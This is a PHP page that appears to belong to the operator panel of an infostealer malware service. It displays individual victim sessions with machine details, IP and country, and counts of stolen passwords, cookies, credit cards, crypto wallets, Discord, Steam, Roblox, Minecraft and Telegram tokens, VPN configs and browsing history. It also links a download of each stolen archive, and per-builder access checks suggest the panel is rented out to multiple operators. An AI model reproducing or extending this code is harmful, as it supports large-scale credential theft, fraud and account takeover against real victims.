<?php
require_once 'xeff/includes/config.php';
require_once 'xeff/includes/auth.php';
requireAuth();

if (empty($_GET['session'])) {
    header("Location: all_logs.php");
    exit;
}

$sessionHash = $_GET['session'];
$stmt = $db->prepare("SELECT * FROM logs WHERE session_hash = ?");
$stmt->execute([$sessionHash]);
$log = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$log) {
    die("Session not found.");
}

// Ensure the user has permission to view this log
if (!isAdmin() && strtolower($log['builder_user']) !== strtolower(getCurrentUsername())) {
    die("Unauthorized.");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Session - <?= sanitize($log['session_hash']) ?></title>
    <link rel="stylesheet" href="xeff/css/elite.css">
</head>
<body>
    <div class="ambient-glow"></div>
    <div class="noise"></div>
    <?php include 'xeff/includes/navbar.php'; ?>
    <div class="main-content" style="max-width: 900px; margin: 40px auto; color: white;">
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <h1>Session Details</h1>
            <a href="download.php?hash=<?= $log['session_hash'] ?>" class="btn-ghost-underline" style="font-weight:bold;">Download Archive</a>
        </div>
        
        <div style="background: rgba(255,255,255,0.05); padding: 20px; border-radius: 12px; margin-top: 20px;">
            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
                <div><strong>Hash:</strong> <span style="font-family: monospace; color:#9ca3af;"><?= sanitize($log['session_hash']) ?></span></div>
                <div><strong>Captured At:</strong> <?= sanitize($log['captured_at']) ?></div>
                <div><strong>Computer:</strong> <?= sanitize($log['computer_name']) ?></div>
                <div><strong>User:</strong> <?= sanitize($log['username']) ?></div>
                <div><strong>IP:</strong> <?= sanitize($log['ip']) ?></div>
                <div><strong>Country:</strong> <?= sanitize($log['country']) ?></div>
                <div><strong>OS:</strong> <?= sanitize($log['os_version']) ?></div>
                <div><strong>Builder:</strong> <?= sanitize($log['builder_user']) ?></div>
            </div>
            
            <h3 style="margin-top:25px; margin-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom:10px;">Extracted Data Stats</h3>
            <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px;">
                <div><strong style="color:#10b981;">Passwords:</strong> <?= $log['passwords_count'] ?></div>
                <div><strong style="color:#10b981;">Cookies:</strong> <?= $log['cookies_count'] ?></div>
                <div><strong style="color:#6366f1;">Discord:</strong> <?= $log['discord_tokens'] ?></div>
                <div><strong style="color:#f59e0b;">Cards:</strong> <?= $log['credit_cards'] ?></div>
                <div><strong style="color:#ef4444;">Roblox:</strong> <?= $log['roblox_cookies'] ?></div>
                <div><strong style="color:#10b981;">Minecraft:</strong> <?= $log['minecraft_tokens'] ?></div>
                <div><strong style="color:#3b82f6;">Steam:</strong> <?= $log['steam_tokens'] ?></div>
                <div><strong style="color:#0ea5e9;">Telegram:</strong> <?= $log['telegram_sessions'] ?></div>
                <div><strong style="color:#f59e0b;">Crypto:</strong> <?= $log['crypto_wallets'] ?></div>
                <div><strong>VPN:</strong> <?= $log['vpn_configs'] ?></div>
                <div><strong>Autofill:</strong> <?= $log['autofills'] ?></div>
                <div><strong>History:</strong> <?= $log['history_entries'] ?></div>
            </div>
        </div>
    </div>
</body>
</html>
